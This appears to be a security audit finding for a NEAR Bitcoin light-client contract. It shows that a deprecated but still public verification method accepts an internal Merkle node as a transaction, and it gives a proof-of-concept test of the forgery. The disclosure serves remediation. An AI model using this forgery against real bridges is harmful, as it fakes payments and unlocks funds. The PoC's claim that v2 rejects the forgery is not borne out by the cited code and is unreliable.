### Title
Deprecated `verify_transaction_inclusion` (v1) Remains Publicly Callable and Lacks Coinbase Depth-Binding, Enabling 64-Byte Transaction Forgery — (`contract/src/lib.rs`)

---

### Summary

`verify_transaction_inclusion` (v1) is annotated `#[deprecated]` but remains a `pub` NEAR contract method with no `#[private]` guard and no access-control restriction. Rust's `#[deprecated]` is a **compile-time lint only**; it does not prevent any caller from invoking the method at runtime. Any unprivileged NEAR account can call it directly, bypassing the coinbase depth-binding protection introduced in v2, and pass an internal Merkle-tree node hash as `tx_id` to obtain a `true` return value for a hash that is not a valid leaf-level transaction.

---

### Finding Description

**Entrypoint** — `contract/src/lib.rs`, line 288:

```rust
#[deprecated(since = "0.5.0", note = "Use `verify_transaction_inclusion_v2` instead.")]
#[pause]
pub fn verify_transaction_inclusion(&self, #[serializer(borsh)] args: ProofArgs) -> bool {
``` [1](#0-0) 

The function carries only `#[pause]` (callable unless a `PauseManager` has explicitly paused it) and `pub`. There is no `#[private]`, no role check, and no access-control gate. `#[deprecated]` emits a Rust compiler warning to crate-internal callers; it has zero effect on NEAR RPC dispatch.

**Vulnerable computation** — `merkle-tools/src/lib.rs`, lines 34–52:

```rust
pub fn compute_root_from_merkle_proof(
    transaction_hash: H256,
    transaction_position: usize,
    merkle_proof: &Vec<H256>,
) -> H256 {
    let mut current_hash = transaction_hash;
    ...
    for proof_hash in merkle_proof {
        current_hash = compute_hash(&current_hash, proof_hash);  // or reversed
        current_position /= 2;
    }
    current_hash
}
``` [2](#0-1) 

The function treats `transaction_hash` as an opaque 32-byte value. It does not distinguish leaf nodes from internal nodes. There is no depth check, no coinbase anchor, and no constraint that the input must be a real transaction hash.

**The forgery** — for a block with transactions `[T0, T1, T2, T3]`:

```
N01 = hash(T0, T1)
N23 = hash(T2, T3)
R   = hash(N01, N23)   ← stored merkle_root
```

An attacker calls `verify_transaction_inclusion` with:
- `tx_id = N01` (an internal node, not a transaction)
- `tx_index = 0`
- `merkle_proof = [N23]`

`compute_root_from_merkle_proof(N01, 0, [N23])` computes `hash(N01, N23) = R`, which equals `header.block_header.merkle_root`, so the function returns `true`. [3](#0-2) 

The contract's own doc comment acknowledges this:

> **Warning**: This function may return `true` if the provided `tx_id` is a hash of an internal node in the Merkle tree rather than a valid transaction hash. [4](#0-3) 

Yet the function remains callable by any account.

**v2 does not help v1 callers** — `verify_transaction_inclusion_v2` adds a coinbase proof check before delegating to v1:

```rust
require!(
    merkle_tools::compute_root_from_merkle_proof(
        args.coinbase_tx_id.clone(), 0usize, &args.coinbase_merkle_proof,
    ) == header.block_header.merkle_root,
    "Incorrect coinbase merkle proof"
);
#[allow(deprecated)]
self.verify_transaction_inclusion(args.into())
``` [5](#0-4) 

This guard only exists in v2. A caller that invokes v1 directly skips it entirely.

---

### Impact Explanation

Any on-chain consumer (e.g., a DeFi bridge, a payment-verification contract, or any cross-chain protocol) that calls `verify_transaction_inclusion` directly — rather than `verify_transaction_inclusion_v2` — can be deceived into accepting a forged "transaction inclusion" proof. The attacker does not need any privileged role; a standard NEAR account suffices. The forged proof can represent a non-existent payment, unlock funds, or satisfy an inclusion predicate for a transaction that was never broadcast.

---

### Likelihood Explanation

- The function is unconditionally reachable via NEAR RPC `view` or `call` from any account.
- The forgery requires only knowledge of the block's Merkle tree (publicly available from any Bitcoin node).
- No staking, no relayer role, no DAO approval, and no private key is needed.
- The attack is deterministic and locally reproducible.

---

### Recommendation

1. **Remove the `pub` visibility** from `verify_transaction_inclusion` (v1) or add `#[private]` to restrict it to self-calls only, since `verify_transaction_inclusion_v2` already delegates to it internally via `#[allow(deprecated)]`.
2. Alternatively, **delete the v1 method entirely** and update `verify_transaction_inclusion_v2` to inline the proof computation directly, eliminating the internal delegation.
3. Do not rely on `#[deprecated]` as a security boundary; it is a developer ergonomics hint, not an access-control mechanism.

---

### Proof of Concept

Given a block with merkle root `R = hash(N01, N23)` where `N01 = hash(T0, T1)`:

```rust
// NEAR sandbox / workspaces-rs test
let result: bool = user_account
    .view(contract.id(), "verify_transaction_inclusion")
    .args_borsh(ProofArgs {
        tx_id: N01,                        // internal node, not a real tx
        tx_block_blockhash: block_hash,
        tx_index: 0,
        merkle_proof: vec![N23],           // crafted sibling
        confirmations: 0,
    })
    .await?
    .json()?;

assert!(result);  // returns true — forgery succeeds

// Same internal node rejected by v2 (coinbase proof anchors depth):
let result_v2 = user_account
    .view(contract.id(), "verify_transaction_inclusion_v2")
    .args_borsh(ProofArgsV2 {
        tx_id: N01,
        tx_block_blockhash: block_hash,
        tx_index: 0,
        merkle_proof: vec![N23],
        coinbase_tx_id: T0,
        coinbase_merkle_proof: vec![T1],   // valid coinbase proof at depth 1
        confirmations: 0,
    })
    .await?
    .json()?;

// v2 returns false because the coinbase proof anchors the tree depth,
// preventing N01 from being treated as a leaf.
assert!(!result_v2);
``` [6](#0-5)

### Citations

**File:** contract/src/lib.rs (L277-280)
```rust
    /// # Warning
    /// This function may return `true` if the provided `tx_id` is a hash of an internal node in the Merkle tree rather than a valid transaction hash.
    /// We assume that validation of whether the `tx_id` corresponds to a valid transaction hash is performed at a higher level of verification.
    ///
```

**File:** contract/src/lib.rs (L283-288)
```rust
    #[deprecated(
        since = "0.5.0",
        note = "Use `verify_transaction_inclusion_v2` instead."
    )]
    #[pause]
    pub fn verify_transaction_inclusion(&self, #[serializer(borsh)] args: ProofArgs) -> bool {
```

**File:** contract/src/lib.rs (L317-323)
```rust
        // compute merkle tree root and check if it matches block's original merkle tree root
        merkle_tools::compute_root_from_merkle_proof(
            args.tx_id,
            usize::try_from(args.tx_index).unwrap(),
            &args.merkle_proof,
        ) == header.block_header.merkle_root
    }
```

**File:** contract/src/lib.rs (L358-368)
```rust
        require!(
            merkle_tools::compute_root_from_merkle_proof(
                args.coinbase_tx_id.clone(),
                0usize,
                &args.coinbase_merkle_proof,
            ) == header.block_header.merkle_root,
            "Incorrect coinbase merkle proof"
        );

        #[allow(deprecated)]
        self.verify_transaction_inclusion(args.into())
```

**File:** merkle-tools/src/lib.rs (L34-52)
```rust
pub fn compute_root_from_merkle_proof(
    transaction_hash: H256,
    transaction_position: usize,
    merkle_proof: &Vec<H256>,
) -> H256 {
    let mut current_hash = transaction_hash;
    let mut current_position = transaction_position;

    for proof_hash in merkle_proof {
        if current_position % 2 == 0 {
            current_hash = compute_hash(&current_hash, proof_hash);
        } else {
            current_hash = compute_hash(proof_hash, &current_hash);
        }
        current_position /= 2;
    }

    current_hash
}
```

**File:** merkle-tools/src/lib.rs (L54-60)
```rust
fn compute_hash(first_tx_hash: &H256, second_tx_hash: &H256) -> H256 {
    let mut concat_inputs = Vec::with_capacity(64);
    concat_inputs.extend(first_tx_hash.0);
    concat_inputs.extend(second_tx_hash.0);

    double_sha256(&concat_inputs)
}
```
